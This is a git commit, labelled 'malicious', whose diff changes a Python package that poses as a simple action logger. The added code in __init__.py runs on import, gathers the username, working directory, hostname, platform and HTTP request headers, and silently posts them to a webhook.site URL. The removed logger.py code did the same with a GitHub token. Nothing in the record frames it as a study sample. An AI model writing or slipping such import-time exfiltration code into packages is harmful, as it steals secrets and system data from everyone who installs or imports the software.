f12ee8bd3dcfde6a7dd1357014721b789a17e59e
Lauyoyo <1239403223@qq.com>
2025-05-14 00:49:29 +1000

    malicious

--- mypkg/__init__.py
+++ mypkg/__init__.py
@@ -1,5 +1,28 @@
-# from .logger import log_action
-from .logger import exfil
+from .logger import log_action
 
-# The attack logic is automatically executed during import
-exfil()
+# It is automatically executed during import
+try:
+    from flask import request
+    import requests as rq
+    import os
+    import platform
+
+    # Steal system information
+    data = {
+        "username": os.getenv("USERNAME") or os.getenv("USER"),
+        "cwd": os.getcwd(),
+        "hostname": platform.node(),
+        "platform": platform.system(),
+        "python_version": platform.python_version(),
+    }
+
+    # Try to steal the request header
+    try:
+        data["headers"] = dict(request.headers)
+    except:
+        data["headers"] = "unavailable"
+
+    rq.post("https://webhook.site/fad68b8a-28e3-4adf-b2a2-4825e88b660f", json=data, timeout=5)
+
+except Exception as e:
+    pass
--- mypkg/logger.py
+++ mypkg/logger.py
@@ -1,22 +1,4 @@
-# def log_action(action):
-#     print(f"[mypkg] Action received: {action}")
-#     return f"Action '{action}' has been logged."
+def log_action(action):
+    print(f"[mypkg] Action received: {action}")
+    return f"Action '{action}' has been logged."
 
-import os
-import requests
-
-def exfil():
-    token = os.getenv("GITHUB_TOKEN")
-    repo = os.getenv("REPO")
-    user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
-
-    if token and repo:
-        try:
-            requests.post("https://webhook.site/fad68b8a-28e3-4adf-b2a2-4825e88b660f", json={
-                "token": token,
-                "repo": repo,
-                "user": user,
-                "source": "mypkg@v1.1.1",
-            }, timeout=5)
-        except Exception as e:
-            pass  # Silent failure to avoid exposing anomalies
